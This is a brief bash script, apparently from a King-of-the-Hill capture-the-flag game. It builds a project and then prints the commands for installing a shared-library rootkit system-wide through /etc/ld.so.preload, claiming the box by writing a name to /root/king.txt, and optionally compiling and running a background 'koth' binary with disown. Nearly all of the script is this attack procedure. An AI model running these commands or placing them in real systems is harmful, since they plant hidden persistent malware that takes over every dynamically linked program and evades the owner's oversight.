#!/bin/bash

make
echo 'sudo cp ./rootkit.so /usr/local/lib/rootkit.so'
echo 'echo /usr/local/lib/rootkit.so > /etc/ld.so.preload'
echo 'echo profxadke > /root/king.txt'
echo 'echo "OPTIONAL:" # gcc -static kothv4.c -o koth.o 2>/dev/null'
echo './koth.o & disown'
